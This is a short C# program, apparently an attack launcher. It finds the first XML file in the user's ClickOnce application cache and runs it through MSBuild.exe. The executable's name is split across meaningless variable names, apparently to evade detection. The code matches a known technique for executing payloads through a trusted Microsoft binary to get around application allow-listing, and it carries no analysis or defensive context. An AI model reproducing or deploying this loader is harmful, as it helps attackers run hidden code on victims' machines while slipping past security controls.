using System;
using System.IO;
using System.Linq;

namespace ClickOnce
{
    class Program
    {
        static void Main(string[] args)
        {
            string tqgvz = "ms";
            System.Diagnostics.Process process = new System.Diagnostics.Process();           
            string part1 = @"C:\Users\";
            string part2 = Environment.UserName;
            string part3 = @"\AppData\Local\Apps\2.0";
            string beyubne = ".exe";
            var path = part1 + part2 + part3;
            var xml = Directory.GetFiles(path, "*.xml", SearchOption.AllDirectories);
            var location = xml.FirstOrDefault();           
            process.StartInfo.Arguments = location;           
            string pqwyreu = "build";          
            string zxcqpiot = @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\";
            var utyioqwe = zxcqpiot + tqgvz + pqwyreu + beyubne;
            process.StartInfo.FileName = utyioqwe;
            process.Start();
        }
    }
}
